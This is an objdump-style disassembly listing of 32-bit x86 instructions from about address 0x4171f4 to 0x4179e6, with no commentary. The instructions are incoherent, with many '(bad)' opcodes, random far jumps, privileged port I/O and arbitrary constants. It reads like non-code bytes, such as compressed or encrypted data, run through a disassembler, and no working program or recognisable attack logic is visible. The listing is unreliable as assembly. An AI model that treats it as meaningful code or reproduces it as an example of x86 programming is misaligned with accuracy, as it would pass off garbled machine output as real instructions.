  4171f4:	adc    edi,edi
  4171f6:	xor    DWORD PTR [esi+0x5a7497e4],ebp
  4171fc:	mov    BYTE PTR [edi-0x5c],al
  4171ff:	repz test eax,0x23931c05
  417205:	xchg   esi,eax
  417206:	js     0x41721a
  417208:	daa    
  417209:	scas   al,BYTE PTR es:[edi]
  41720a:	jge    0x4171df
  41720c:	(bad)  
  41720d:	rcr    DWORD PTR [edx+esi*8+0x56],cl
  417211:	and    BYTE PTR [ebx-0x51],bh
  417214:	inc    esi
  417215:	sahf   
  417216:	adc    edx,DWORD PTR [esi+eiz*8+0x1449adb9]
  41721d:	mov    dl,0xce
  41721f:	aaa    
  417220:	mov    WORD PTR [eax-0x24bc1d6b],ds
  417226:	xor    esp,DWORD PTR [ebx-0xf]
  417229:	stc    
  41722a:	popa   
  41722b:	cwde   
  41722c:	jp     0x417264
  41722e:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  417230:	inc    ecx
  417231:	inc    eax
  417232:	ja     0x41723a
  417234:	xlat   BYTE PTR ds:[ebx]
  417235:	jno    0x41726b
  417237:	sub    esi,DWORD PTR fs:[eax-0x34fafa2b]
  41723e:	ja     0x417298
  417240:	mov    BYTE PTR [edx-0x38a56f87],ah
  417246:	jb     0x4171df
  417248:	aad    0xa
  41724a:	pusha  
  41724b:	pop    ecx
  41724c:	jmp    DWORD PTR [ecx-0x60055a63]
  417252:	mov    edi,?
  417254:	sbb    edx,DWORD PTR [edi]
  417256:	lods   eax,DWORD PTR ds:[esi]
  417257:	mov    bh,0xd5
  417259:	jae    0x417203
  41725b:	mov    eax,0x9b644e7b
  417260:	mov    ecx,DWORD PTR ds:0x68ef950b
  417266:	scas   al,BYTE PTR es:[edi]
  417267:	mov    esi,0xa562a0ef
  41726c:	ret    
  41726d:	sub    al,0x66
  41726f:	rcl    BYTE PTR [ecx+edi*8],0x0
  417273:	push   es
  417274:	and    ecx,edx
  417276:	xchg   ebp,eax
  417277:	mul    DWORD PTR [eax+0x622eece]
  41727d:	mov    ecx,0x23193a81
  417282:	and    eax,0x13a90e92
  417287:	sbb    bl,BYTE PTR [edi+0x1920f442]
  41728d:	sbb    esp,0xffffffc9
  417290:	mov    ?,WORD PTR [ebx+esi*8-0x75]
  417294:	xchg   ebx,eax
  417295:	or     DWORD PTR [ecx],esi
  417297:	lock loope 0x4172a5
  41729a:	inc    ebp
  41729b:	fnstenv [ebp+0x41]
  41729e:	out    dx,al
  41729f:	dec    ecx
  4172a0:	js     0x4172e1
  4172a2:	aam    0xee
  4172a4:	data16 out 0x65,al
  4172a7:	das    
  4172a8:	pmulhw mm1,QWORD PTR [esi+0x4b3afe00]
  4172af:	pop    ds
  4172b0:	sub    BYTE PTR [edi],0xed
  4172b3:	fsub   QWORD PTR [ebp+0xb]
  4172b6:	cmp    eax,0x30b8faf1
  4172bb:	stos   DWORD PTR es:[edi],eax
  4172bc:	fsub   st,st(2)
  4172be:	in     al,0xb3
  4172c0:	jnp    0x417256
  4172c2:	repz (bad) 
  4172c4:	js     0x4172a1
  4172c6:	dec    ebx
  4172c7:	jne    0x41731f
  4172c9:	or     al,0x58
  4172cb:	sub    eax,0xaceff3cf
  4172d0:	mov    edx,0xf870f407
  4172d5:	data16 cld 
  4172d7:	inc    eax
  4172d8:	dec    ebx
  4172d9:	push   edx
  4172da:	cdq    
  4172db:	and    BYTE PTR [ebp+0x9],0x92
  4172df:	fmul   st,st(5)
  4172e1:	sti    
  4172e2:	mov    al,0x5d
  4172e4:	mov    ecx,0x7c12655a
  4172e9:	repz push esp
  4172eb:	shl    DWORD PTR [ecx-0x543df8d2],cl
  4172f1:	push   ecx
  4172f2:	out    0xfc,eax
  4172f4:	std    
  4172f5:	sbb    edi,edx
  4172f7:	inc    esi
  4172f8:	rol    BYTE PTR [ebx-0x40],1
  4172fb:	add    eax,0x976e868
  417300:	push   esi
  417301:	jmp    0x8d36:0x354408
  417308:	sub    eax,0x22d79214
  41730d:	into   
  41730e:	fidiv  DWORD PTR [edi]
  417310:	xchg   edi,eax
  417311:	add    al,bh
  417313:	add    edx,DWORD PTR ds:0xe3b20c2c
  417319:	pop    ecx
  41731a:	push   0x40
  41731c:	fscale 
  41731e:	pop    eax
  41731f:	dec    DWORD PTR [edi-0x2c]
  417322:	jmp    0x4172fa
  417324:	dec    esp
  417325:	dec    esi
  417326:	mov    cl,0xe5
  417328:	pusha  
  417329:	mov    bh,0x69
  41732b:	hlt    
  41732c:	xchg   esp,eax
  41732d:	imul   esp,esi,0xffffffbc
  417330:	cli    
  417331:	sub    eax,0xd6f20cef
  417336:	xor    DWORD PTR [eax+0x68],esp
  417339:	pop    esi
  41733a:	adc    al,0x76
  41733c:	push   edx
  41733d:	jmp    0x417327
  41733f:	mov    cl,0x94
  417341:	pop    ss
  417342:	cmp    eax,0xbc4698d4
  417347:	ins    DWORD PTR es:[edi],dx
  417348:	(bad)  
  417349:	lahf   
  41734a:	rol    DWORD PTR [ecx+ecx*8+0x29e196cc],cl
  417351:	mov    edx,0xd950c145
  417356:	(bad)  
  417357:	ror    DWORD PTR [edx-0x6437ed20],cl
  41735d:	call   0x7fb1ef1
  417362:	inc    eax
  417363:	xor    eax,0x5a3d6384
  417368:	dec    DWORD PTR [ebp+esi*8-0x67]
  41736c:	adc    edx,esi
  41736e:	cmp    eax,0x727bf17f
  417373:	sbb    BYTE PTR [eax+0x403c6393],dl
  417379:	xor    BYTE PTR [edx+0x4],bh
  41737c:	or     ecx,DWORD PTR [ecx]
  41737e:	ss nop
  417380:	clc    
  417381:	sbb    al,0x60
  417383:	dec    esi
  417384:	push   es
  417385:	sar    bl,cl
  417387:	sbb    eax,0x2baa8a8a
  41738c:	retf   
  41738d:	ins    BYTE PTR es:[edi],dx
  41738e:	(bad)  
  41738f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417390:	sub    eax,0xcc9cf12
  417395:	(bad)  
  417396:	gs retf 
  417398:	lods   al,BYTE PTR ds:[esi]
  417399:	and    BYTE PTR [edi-0x5bed3885],bh
  41739f:	or     BYTE PTR [ebx+0x21],bl
  4173a2:	pop    ds
  4173a3:	popf   
  4173a4:	push   esp
  4173a5:	and    DWORD PTR [ebx],ecx
  4173a7:	fild   DWORD PTR [eax]
  4173a9:	push   ebp
  4173aa:	inc    ebp
  4173ab:	pop    ecx
  4173ac:	xchg   esi,eax
  4173ad:	adc    BYTE PTR [ebp+0x7828fe52],0x69
  4173b4:	cmp    BYTE PTR [di+0x1b],0x96
  4173b9:	pop    edi
  4173ba:	outs   dx,DWORD PTR ds:[esi]
  4173bb:	jmp    0x5629:0x2452f171
  4173c2:	stc    
  4173c3:	(bad)  
  4173c4:	in     al,0x5
  4173c6:	int    0xbb
  4173c8:	(bad)  
  4173c9:	mov    ss,edx
  4173cb:	fbstp  TBYTE PTR [edi-0x56]
  4173ce:	sub    WORD PTR [ecx-0x6ed0c37c],bx
  4173d5:	aas    
  4173d6:	mov    ecx,0x47450b2b
  4173db:	test   eax,0xeae97e8f
  4173e0:	fwait
  4173e1:	mov    edi,0xe524b2a1
  4173e6:	pop    esi
  4173e7:	stos   DWORD PTR es:[edi],eax
  4173e8:	rol    DWORD PTR [ebx-0x25],cl
  4173eb:	mov    ecx,0x2f4739fc
  4173f0:	lahf   
  4173f1:	and    eax,0xe0de243e
  4173f6:	sub    dl,BYTE PTR [esi+0xb9fbb0f]
  4173fc:	ror    bl,cl
  4173fe:	add    al,0xb7
  417400:	sbb    eax,0x58bf2976
  417405:	cmp    al,0xe1
  417407:	aad    0x3c
  417409:	add    al,0x42
  41740b:	cmp    BYTE PTR [esi],0x7d
  41740e:	das    
  41740f:	mov    dl,0xcb
  417411:	outs   dx,DWORD PTR ds:[esi]
  417412:	and    DWORD PTR [ecx-0x3f],ecx
  417415:	nop
  417416:	sub    eax,0x97bfd8c0
  41741b:	mov    bh,0xc7
  41741d:	dec    edx
  41741e:	or     ch,BYTE PTR [ebx]
  417420:	xchg   edi,eax
  417421:	push   0x1391ee54
  417426:	sahf   
  417427:	test   bl,dh
  417429:	inc    DWORD PTR [ecx]
  41742b:	xor    BYTE PTR ds:0xa116388,ah
  417431:	popa   
  417432:	(bad)  
  417433:	(bad)  [edi+ebx*4+0x6326b425]
  41743a:	push   edi
  41743b:	mov    ecx,0x643836ec
  417440:	outs   dx,BYTE PTR ds:[esi]
  417441:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417442:	int    0x1b
  417444:	add    esp,edx
  417446:	mov    DWORD PTR [eax+0xe7601ab],0xafdc31f7
  417450:	(bad)  
  417452:	mov    ebp,0xc615f575
  417457:	or     BYTE PTR [edi-0x75d3a4c],dh
  41745d:	inc    esi
  41745e:	pop    esi
  41745f:	ror    esp,1
  417461:	sbb    DWORD PTR [esi+0x8],eax
  417464:	sub    DWORD PTR ds:0xf80fcbeb,edi
  41746a:	pop    edi
  41746b:	jge    0x41747f
  41746d:	repz jg 0x4173f5
  417470:	jl     0x41747f
  417472:	cmp    DWORD PTR [eax+0x31eafd1],ebp
  417478:	stos   DWORD PTR es:[edi],eax
  417479:	mov    dl,0x8d
  41747b:	cli    
  41747c:	xlat   BYTE PTR ds:[ebx]
  41747d:	loope  0x417424
  41747f:	mov    eax,ds:0x24afe79d
  417484:	fld    DWORD PTR [ecx-0x17a99040]
  41748a:	cmp    ah,BYTE PTR [eax-0x66]
  41748d:	(bad)  
  41748e:	jle    0x4174d7
  417490:	inc    esp
  417491:	inc    ebp
  417492:	sub    dh,ah
  417494:	xor    eax,0x38b4eb2f
  417499:	int3   
  41749a:	jp     0x41741c
  41749c:	jmp    0xf796:0xb20c0a07
  4174a3:	cld    
  4174a4:	daa    
  4174a5:	adc    al,0x17
  4174a7:	mov    ch,0x12
  4174a9:	clc    
  4174aa:	mov    esp,0x8a74972b
  4174af:	pusha  
  4174b0:	(bad)  
  4174b1:	dec    esp
  4174b2:	xor    ebx,DWORD PTR [edx-0x2c]
  4174b5:	push   0x32
  4174b7:	add    al,0xab
  4174b9:	clc    
  4174ba:	jecxz  0x4174a7
  4174bc:	xchg   edi,eax
  4174bd:	cmp    dl,0x63
  4174c0:	adc    DWORD PTR [edx-0xa],ebp
  4174c3:	test   BYTE PTR [esi+0x6baca491],dl
  4174c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174ca:	stos   DWORD PTR es:[edi],eax
  4174cb:	push   edx
  4174cc:	sub    ah,dl
  4174ce:	iret   
  4174cf:	mov    esi,0xd84f8742
  4174d4:	ins    DWORD PTR es:[edi],dx
  4174d5:	in     eax,0x93
  4174d7:	retf   0x5a0d
  4174da:	iret   
  4174db:	push   ds
  4174dc:	(bad)  [ecx]
  4174de:	add    esp,edx
  4174e0:	cmp    edx,DWORD PTR [edx-0x37a047d6]
  4174e6:	into   
  4174e7:	jge    0x4174b8
  4174e9:	dec    ebx
  4174ea:	xor    cl,BYTE PTR [ecx-0x6312373f]
  4174f0:	or     edi,DWORD PTR [edx+0x3f]
  4174f3:	iret   
  4174f4:	pop    ebx
  4174f5:	sbb    BYTE PTR [esp+ebx*1+0x29],ah
  4174f9:	sub    edi,esi
  4174fb:	inc    ecx
  4174fc:	mov    BYTE PTR [ecx],bh
  4174fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174ff:	hlt    
  417500:	inc    edi
  417501:	push   edi
  417502:	arpl   WORD PTR [ebx-0x2bcaa4f2],cx
  417508:	mov    ebp,0xad36a125
  41750d:	mov    bh,0xd1
  41750f:	jbe    0x41756f
  417511:	pushf  
  417512:	jl     0x4174fc
  417514:	in     al,dx
  417515:	je     0x417559
  417517:	mov    bh,0x75
  417519:	iret   
  41751a:	xchg   ebx,eax
  41751b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41751c:	xor    dh,dh
  41751e:	daa    
  41751f:	push   0x543c0849
  417524:	sub    dh,BYTE PTR [edx+0x4e]
  417527:	fnstsw WORD PTR [ebx-0x42491026]
  41752d:	test   al,0x96
  41752f:	mov    edi,0x756b380
  417534:	lahf   
  417535:	gs ja  0x41752f
  417538:	inc    eax
  417539:	xchg   esp,eax
  41753a:	hlt    
  41753b:	sahf   
  41753c:	push   0x528a5253
  417541:	es push cs
  417543:	(bad)  
  417544:	(bad)  
  417545:	inc    DWORD PTR [edi]
  417547:	mov    ecx,0x2e626e9
  41754c:	inc    eax
  41754d:	loop   0x4175a7
  41754f:	fwait
  417550:	outs   dx,DWORD PTR ds:[esi]
  417551:	push   eax
  417552:	icebp  
  417553:	adc    eax,0x9c793c13
  417558:	ret    
  417559:	lock es in al,0xba
  41755d:	sub    eax,0x588ecab8
  417562:	mov    esp,0x745e3b3c
  417567:	imul   esi,DWORD PTR [eax-0x1d1ec726],0xbe2c6e3d
  417571:	lods   eax,DWORD PTR ds:[esi]
  417572:	(bad)  
  417574:	sbb    BYTE PTR [ebx+eax*4],0x96
  417578:	into   
  417579:	lock fwait
  41757b:	or     cl,BYTE PTR [ecx+0x42dc6446]
  417581:	sbb    BYTE PTR [esi+0x680a1e6],bh
  417587:	cdq    
  417588:	push   ecx
  417589:	pop    edi
  41758a:	popf   
  41758b:	dec    ebx
  41758c:	mov    esi,0x5320a8ee
  417591:	sub    ebx,edx
  417593:	jno    0x4175dd
  417595:	xchg   ebp,eax
  417596:	(bad)  
  417597:	pushf  
  417598:	fcomp  QWORD PTR [ebx-0x56]
  41759b:	sub    BYTE PTR [ecx-0x1d],al
  41759e:	scas   eax,DWORD PTR es:[edi]
  41759f:	jmp    0x9c38:0x1b00c10a
  4175a6:	pop    ecx
  4175a7:	xlat   BYTE PTR ds:[ebx]
  4175a8:	pop    edx
  4175a9:	jne    0x4175e8
  4175ab:	mov    edi,0x83f5d9c
  4175b0:	int3   
  4175b1:	jg     0x4175ac
  4175b3:	or     ecx,edx
  4175b5:	stos   DWORD PTR es:[edi],eax
  4175b6:	int    0x17
  4175b8:	in     eax,dx
  4175b9:	mov    ah,0x21
  4175bb:	pop    esp
  4175bc:	ret    
  4175bd:	mov    ds:0x63869938,eax
  4175c2:	and    eax,0x13c07b75
  4175c7:	adc    eax,0xa4c2da91
  4175cc:	imul   edi,DWORD PTR [esi],0xffffffde
  4175cf:	pop    es
  4175d0:	lds    esi,FWORD PTR [ecx-0x7d]
  4175d3:	pop    esp
  4175d4:	inc    ebx
  4175d5:	jg     0x417598
  4175d7:	jns    0x41757b
  4175d9:	aad    0xd9
  4175db:	sar    BYTE PTR [edi+0x64399d57],0xea
  4175e2:	add    BYTE PTR [ecx],bl
  4175e4:	sar    dl,1
  4175e6:	mov    ds:0xc6e80769,eax
  4175eb:	fldl2e 
  4175ed:	sbb    esi,edi
  4175ef:	inc    ebp
  4175f0:	mov    bh,0x2c
  4175f2:	and    DWORD PTR [ebp-0x5d],ebx
  4175f5:	cld    
  4175f6:	push   0x836f6639
  4175fb:	push   0x798caced
  417600:	jne    0x4175e5
  417602:	stos   BYTE PTR es:[edi],al
  417603:	or     eax,0x1f2ce516
  417608:	xchg   ebx,eax
  417609:	mov    eax,ds:0xe05783e
  41760e:	repnz xlat BYTE PTR ds:[ebx]
  417610:	mov    bl,0x35
  417612:	mov    al,ds:0x35a86155
  417617:	fs sbb esi,ebp
  41761a:	loope  0x4175d6
  41761c:	push   es
  41761d:	sar    DWORD PTR [ecx+eax*4+0x51b8e5af],1
  417624:	add    eax,0x7034065
  417629:	rcr    DWORD PTR [edx],cl
  41762b:	sahf   
  41762c:	outs   dx,DWORD PTR ds:[esi]
  41762d:	inc    eax
  41762e:	test   eax,0x1c48a8df
  417633:	push   0x9a562758
  417638:	push   ebx
  417639:	pop    ecx
  41763a:	pushf  
  41763b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41763c:	aas    
  41763d:	imul   ebx,esp,0x4eab1ea6
  417643:	lea    ebp,[ecx+0x5]
  417646:	(bad)  
  417647:	faddp  st(2),st
  417649:	mov    edi,0xee142265
  41764e:	nop
  41764f:	xor    bh,BYTE PTR [eax+0x79011380]
  417655:	call   FWORD PTR [eax]
  417657:	lods   eax,DWORD PTR ds:[esi]
  417658:	or     esi,DWORD PTR ds:[ecx+0x3a]
  41765c:	ret    
  41765d:	popa   
  41765e:	jge    0x4176c6
  417660:	inc    ebx
  417661:	cmp    ch,BYTE PTR [ebp+0x9]
  417664:	xchg   dh,dl
  417666:	iret   
  417667:	xchg   ebp,eax
  417668:	daa    
  417669:	mov    WORD PTR [esi-0x42304cd6],ds
  41766f:	pusha  
  417670:	cmc    
  417671:	mov    al,BYTE PTR [ebx+0x2]
  417674:	gs call edx
  417677:	in     eax,dx
  417678:	sbb    BYTE PTR [ebx+edi*4],bh
  41767b:	(bad)  [eax+0x17a669c7]
  417681:	add    DWORD PTR ds:0xeda2e4da,ecx
  417687:	in     al,dx
  417688:	mov    edx,0x2c27f76
  41768d:	(bad)  
  41768e:	sub    eax,esp
  417690:	js     0x41766f
  417692:	(bad)  
  417693:	iret   
  417694:	pushf  
  417695:	xor    eax,0xbe614e14
  41769a:	pop    es
  41769b:	xor    eax,0xdbb4a26e
  4176a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176a1:	inc    BYTE PTR [eax-0x650d03f7]
  4176a7:	mov    ah,0x41
  4176a9:	jnp    0x417714
  4176ab:	push   ebx
  4176ac:	xlat   BYTE PTR ds:[ebx]
  4176ad:	imul   esi,DWORD PTR [ebx],0x6cdebc77
  4176b3:	push   edi
  4176b4:	in     al,dx
  4176b5:	outs   dx,BYTE PTR ds:[esi]
  4176b6:	nop    DWORD PTR [eax+0x2c840f21]
  4176bd:	data16 scas al,BYTE PTR es:[edi]
  4176bf:	adc    al,0xeb
  4176c1:	lahf   
  4176c2:	cmp    eax,0x3b4a66a1
  4176c7:	aam    0x65
  4176c9:	jmp    0x19db0942
  4176ce:	iret   
  4176cf:	pop    ds
  4176d0:	mov    cl,0xcc
  4176d2:	jp     0x4176fe
  4176d4:	jge    0x41771e
  4176d6:	mov    dh,0x2f
  4176d8:	xor    DWORD PTR [esi-0x5b],0x34
  4176dc:	idiv   BYTE PTR [esi+0x6099a0e3]
  4176e2:	mov    ch,0x9a
  4176e4:	fstp   TBYTE PTR [ecx+0x126a551c]
  4176ea:	stos   BYTE PTR es:[edi],al
  4176eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176ec:	in     eax,dx
  4176ed:	sbb    BYTE PTR [edx+0x3dbc5b],cl
  4176f3:	das    
  4176f4:	push   ebx
  4176f5:	leave  
  4176f6:	jmp    0xa3907113
  4176fb:	jp     0x41767d
  4176fd:	xchg   edx,eax
  4176fe:	and    eax,0xcaa1d46d
  417703:	icebp  
  417704:	cmp    BYTE PTR [ecx],0x13
  417707:	sbb    al,BYTE PTR [esi+ebp*4+0x435880f2]
  41770e:	jmp    0x417718
  417710:	xchg   DWORD PTR [ebx-0x2e10c894],ecx
  417716:	inc    esi
  417717:	outs   dx,DWORD PTR ds:[esi]
  417718:	xchg   edx,eax
  417719:	xlat   BYTE PTR ds:[ebx]
  41771a:	inc    ecx
  41771b:	xor    al,0xbf
  41771d:	fistp  WORD PTR [ebp+0x316f3b80]
  417723:	jp     0x417736
  417725:	or     BYTE PTR [ecx+esi*2+0x17],al
  417729:	lea    ebp,[ecx-0x7d7a448d]
  41772f:	je     0x417775
  417731:	clc    
  417732:	rcl    BYTE PTR [eax+edi*1-0x17],0x21
  417737:	sub    ebx,DWORD PTR [ebx+0x2b2c7f76]
  41773d:	or     al,0x34
  41773f:	cmp    al,dh
  417741:	jmp    0x2b66:0xeb9ebc72
  417748:	ins    DWORD PTR es:[edi],dx
  417749:	out    dx,eax
  41774a:	xor    DWORD PTR [ebx],edi
  41774c:	out    dx,al
  41774d:	inc    ecx
  41774e:	test   al,0x88
  417750:	inc    ecx
  417751:	sbb    cl,BYTE PTR [ecx]
  417753:	cmp    dl,ah
  417755:	adc    DWORD PTR [edi+0x1dc19321],0xffffffd0
  41775c:	jnp    0x4176fe
  41775e:	dec    esp
  41775f:	ret    
  417760:	sub    eax,0x35424df4
  417765:	in     al,dx
  417766:	cmp    dh,BYTE PTR [ebp+0x55]
  417769:	pop    edi
  41776a:	test   al,bl
  41776c:	dec    edi
  41776d:	(bad)  
  41776e:	xlat   BYTE PTR ds:[ebx]
  41776f:	mov    al,ds:0x9f893d39
  417774:	cwde   
  417775:	retf   
  417776:	or     al,0x72
  417778:	rcl    DWORD PTR [ebx+0x74],cl
  41777b:	sbb    BYTE PTR ds:0x8fce471f,bl
  417781:	loop   0x417745
  417783:	jg     0x417737
  417785:	xchg   esp,eax
  417786:	inc    eax
  417787:	ja     0x417726
  417789:	pushf  
  41778a:	dec    ebp
  41778b:	jne    0x4177b2
  41778d:	and    BYTE PTR [ecx-0x78205029],dh
  417793:	dec    esi
  417794:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417795:	shl    DWORD PTR [edi],cl
  417797:	retf   0x3db2
  41779a:	push   eax
  41779b:	sub    BYTE PTR [ebx],0x53
  41779e:	fwait
  41779f:	xor    eax,0x16868e8b
  4177a4:	outs   dx,BYTE PTR ds:[esi]
  4177a5:	cld    
  4177a6:	mov    ecx,0x31bc56a8
  4177ab:	fdivr  DWORD PTR [edi+0xd]
  4177ae:	xchg   DWORD PTR [edi-0x35],ebx
  4177b1:	and    eax,0x3f235949
  4177b6:	int    0xe1
  4177b8:	repz dec eax
  4177ba:	inc    ebp
  4177bb:	daa    
  4177bc:	stc    
  4177bd:	push   eax
  4177be:	pop    edi
  4177bf:	shl    BYTE PTR [edi],1
  4177c1:	ins    DWORD PTR es:[edi],dx
  4177c2:	mov    fs,WORD PTR [esi+0x55]
  4177c5:	gs xor al,0x7b
  4177c8:	adc    al,0x31
  4177ca:	data16 std 
  4177cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177cd:	jl     0x4177ca
  4177cf:	out    0x81,eax
  4177d1:	outs   dx,DWORD PTR ds:[esi]
  4177d2:	std    
  4177d3:	shl    ah,0xd7
  4177d6:	push   eax
  4177d7:	dec    eax
  4177d8:	cmp    ecx,esi
  4177da:	mov    eax,0x789fa3dd
  4177df:	xor    cl,BYTE PTR [esi+0x1e]
  4177e2:	retf   0xa976
  4177e5:	mov    dh,0xc7
  4177e7:	out    dx,al
  4177e8:	xor    al,BYTE PTR [ebx]
  4177ea:	cwde   
  4177eb:	push   edx
  4177ec:	icebp  
  4177ed:	mov    bl,0xfd
  4177ef:	push   0x950d6129
  4177f4:	jl     0x41785e
  4177f6:	mov    ds:0xf1aed919,al
  4177fb:	sbb    eax,0xa058a579
  417800:	aaa    
  417801:	mov    cl,0x29
  417803:	outs   dx,BYTE PTR ds:[esi]
  417804:	mov    cl,0xda
  417806:	icebp  
  417807:	jg     0x417870
  417809:	dec    esi
  41780a:	push   ss
  41780b:	data16 adc BYTE PTR [esi+0x65150764],ah
  417812:	xchg   DWORD PTR [esi],edi
  417814:	inc    edi
  417815:	loop   0x417876
  417817:	jge    0x41785f
  417819:	ud2    
  41781b:	mov    bh,0x6a
  41781d:	mov    ecx,0xcd8e0294
  417822:	retf   0x33d3
  417825:	enter  0x904,0xe3
  417829:	xor    ecx,DWORD PTR [ebx]
  41782b:	out    0xeb,al
  41782d:	lahf   
  41782e:	sub    ecx,DWORD PTR [eax-0x67767b56]
  417834:	lods   eax,DWORD PTR ds:[esi]
  417835:	and    BYTE PTR [ebx-0x150d253d],ah
  41783b:	and    al,BYTE PTR [ecx-0x53883d9a]
  417841:	push   ds
  417842:	stos   BYTE PTR es:[edi],al
  417843:	push   esp
  417844:	sub    dl,ch
  417846:	jno    0x417830
  417848:	mov    ds:0xbaba95a5,al
  41784d:	pop    eax
  41784e:	add    BYTE PTR [ecx-0x1038736a],cl
  417854:	popf   
  417855:	mov    ds:0x941eedb0,eax
  41785a:	mov    ebp,0xe454a4c
  41785f:	sub    al,0x5f
  417861:	sar    DWORD PTR [ebx-0x7b72cf94],0xc0
  417868:	and    DWORD PTR [ecx+0x44],0xde4296a
  41786f:	fst    QWORD PTR [eax]
  417871:	xor    eax,0xbd50ed8c
  417876:	or     bh,dl
  417878:	mov    dl,0xe1
  41787a:	jo     0x4178bf
  41787c:	add    esp,DWORD PTR [ecx+0x20430776]
  417882:	and    DWORD PTR [ebp+edi*2-0x3d87ec1d],edi
  417889:	mov    ds:0x1211172a,eax
  41788e:	arpl   WORD PTR [edi],bp
  417890:	sub    esp,DWORD PTR [esi]
  417892:	mov    al,ds:0xde9896b4
  417897:	push   0xea9f4cd6
  41789c:	xor    ch,al
  41789e:	or     eax,0x9f052a7b
  4178a3:	jmp    0x8e3b1294
  4178a8:	xchg   DWORD PTR [ecx],esi
  4178aa:	inc    esp
  4178ab:	dec    ecx
  4178ac:	sahf   
  4178ad:	loope  0x417901
  4178af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178b0:	out    0xfc,al
  4178b2:	add    eax,0xd60a55d2
  4178b7:	sub    DWORD PTR [edi-0x59ec0bc1],ebx
  4178bd:	(bad)  
  4178be:	jl     0x417935
  4178c0:	sub    eax,0xfdcdb072
  4178c5:	mov    ebp,0x3a6e4b4e
  4178ca:	enter  0x201f,0xa6
  4178ce:	inc    ebp
  4178cf:	sti    
  4178d0:	lds    edi,FWORD PTR [eax+0x12]
  4178d3:	sbb    BYTE PTR [edx+edx*2-0x2ca3cc6b],al
  4178da:	cmp    BYTE PTR ds:[ebx+0x5c],bh
  4178de:	xor    eax,0xf8c2d0a7
  4178e3:	(bad)  [ecx]
  4178e5:	pop    esi
  4178e6:	dec    ecx
  4178e7:	ret    
  4178e8:	xchg   edi,eax
  4178e9:	xor    ah,BYTE PTR [eax]
  4178eb:	xor    al,0x5f
  4178ed:	push   es
  4178ee:	pop    ebp
  4178ef:	pop    ebx
  4178f0:	outs   dx,DWORD PTR ds:[esi]
  4178f1:	sub    DWORD PTR [eax+0x58],eax
  4178f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178f5:	xchg   esi,eax
  4178f6:	pop    es
  4178f7:	jno    0x4178d7
  4178f9:	xor    eax,0xf02786d6
  4178fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178ff:	xor    ch,al
  417901:	outs   dx,BYTE PTR ds:[esi]
  417902:	pusha  
  417903:	repz mov al,0x27
  417906:	and    cl,bh
  417908:	les    ecx,FWORD PTR [edx-0x12]
  41790b:	scas   al,BYTE PTR es:[edi]
  41790c:	xor    eax,0xd45e2478
  417911:	pop    ebx
  417912:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417913:	xor    bh,0x7a
  417916:	mov    ebp,0x5b8dfbad
  41791b:	push   esp
  41791c:	jg     0x417907
  41791e:	cmp    DWORD PTR [eax],eax
  417920:	retf   
  417921:	inc    ecx
  417922:	or     bl,BYTE PTR [ecx-0x16]
  417925:	mov    ecx,0xc2fba8e4
  41792a:	or     al,0x45
  41792c:	icebp  
  41792d:	inc    DWORD PTR ds:[esi+0x34d76a3e]
  417934:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417935:	or     bh,BYTE PTR [ecx-0x7b]
  417938:	cmc    
  417939:	add    DWORD PTR [ecx],0x768aa1c5
  41793f:	icebp  
  417940:	mov    eax,ds:0xa6a0621d
  417945:	xchg   DWORD PTR [ecx+ebx*1],esp
  417948:	fsubr  DWORD PTR [edi-0x7f]
  41794b:	(bad)  
  41794d:	cmp    DWORD PTR [ecx-0x6aa738fa],esi
  417953:	xchg   ebp,eax
  417954:	mov    al,ds:0x112a93ee
  417959:	fdiv   QWORD PTR [ebx+0x77]
  41795c:	inc    eax
  41795d:	xor    al,0xee
  41795f:	aam    0xc2
  417961:	mov    edx,0x524b3a0c
  417966:	and    BYTE PTR [esi],ah
  417968:	xchg   ebp,eax
  417969:	lods   eax,DWORD PTR ds:[esi]
  41796a:	test   DWORD PTR [eax+eiz*4-0x79],ecx
  41796e:	or     eax,0xb641d7f8
  417973:	mov    ebx,DWORD PTR [esp+edx*2-0x9ec3ed2]
  41797a:	scas   al,BYTE PTR es:[edi]
  41797b:	retf   
  41797c:	add    al,0xed
  41797f:	pop    ebp
  417980:	jo     0x4179cc
  417982:	dec    ebx
  417983:	jne    0x4179d5
  417985:	jae    0x4179da
  417987:	xchg   esp,eax
  417988:	ret    0x25ed
  41798b:	mov    ah,0xe2
  41798d:	lock pop ecx
  41798f:	mov    ebp,DWORD PTR [ebx+0x1651ed02]
  417995:	retf   
  417996:	fwait
  417997:	xor    BYTE PTR [esp+ecx*2],dh
  41799a:	mov    es,WORD PTR [edx+edx*4-0x9a1af70]
  4179a1:	repz jmp 0x92d3:0xb11e1e93
  4179a9:	and    al,0x75
  4179ab:	retf   0x8aa4
  4179ae:	mov    ds,WORD PTR [eax-0x5e]
  4179b1:	sub    DWORD PTR [edx-0x43625a0d],edx
  4179b7:	pop    esp
  4179b8:	lock in eax,dx
  4179ba:	neg    DWORD PTR [ebp+ebp*4+0x301244e5]
  4179c1:	adc    DWORD PTR [ebp-0x11],eax
  4179c4:	sub    bl,BYTE PTR [ebx]
  4179c6:	jnp    0x417975
  4179c8:	jp     0x4179dc
  4179ca:	sub    DWORD PTR [edi-0x1ce29a09],ebx
  4179d0:	mov    edx,0xb00c0300
  4179d5:	jne    0x4179b5
  4179d7:	dec    edx
  4179d8:	push   ds
  4179d9:	xor    dh,cl
  4179db:	cmp    ebp,DWORD PTR [esi+ebx*1]
  4179de:	jae    0x41799f
  4179e0:	push   edx
  4179e1:	push   esp
  4179e2:	dec    edi
  4179e3:	test   DWORD PTR [ebx-0x67],edx
  4179e6:	enter  0xdc34,0xfc
